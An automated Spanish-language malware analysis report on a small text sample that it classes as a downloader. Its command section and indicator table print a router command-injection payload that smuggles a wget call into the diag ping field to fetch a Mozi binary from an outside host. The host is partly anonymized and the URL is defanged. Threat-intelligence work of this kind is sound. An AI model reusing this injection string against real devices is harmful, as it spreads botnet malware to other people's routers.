# 🧬 Payload Analysis

`b1791d2359ec91e63c7affc1205f7c91b3daf32e70ac344208f41278a13e6817`

## 📌 Resumen

Texto ASCII de 118 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `Mozi.m+-O+-` en `hxxp://27.215.47.XXX:58445/Mozi.m+-O+-`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget hxxp://27.215.47.XXX:58445/Mozi.m -O ->/tmp/gpon80` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/b1791d2359ec91e63c7affc1205f7c91b3daf32e70ac344208f41278a13e6817.md](../../../../../malware-like/oraculo/downloader/b1791d2359ec91e63c7affc1205f7c91b3daf32e70ac344208f41278a13e6817.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:29:35.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `b1791d2359ec91e63c7affc1205f7c91b3daf32e70ac344208f41278a13e6817`
- **SHA1:** `48c6f9a2828df456e7f4243623d95ee51505cc61`
- **MD5:** `41d0767278837b4c687559fdf3825992`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 118 B |
| Entropía | 5.12 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://27.215.47.XXX:58445/Mozi.m+-O+->/tmp/gpon80;
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://27.215.47.XXX:58445/Mozi.m+-O+- | strings |
| ip | 27.215.47.XXX | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://27.215.47.XXX:58445/Mozi.m+-O+->/tmp/gpon80; | strings |
| hash | b1791d2359ec91e63c7affc1205f7c91b3daf32e70ac344208f41278a13e6817 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
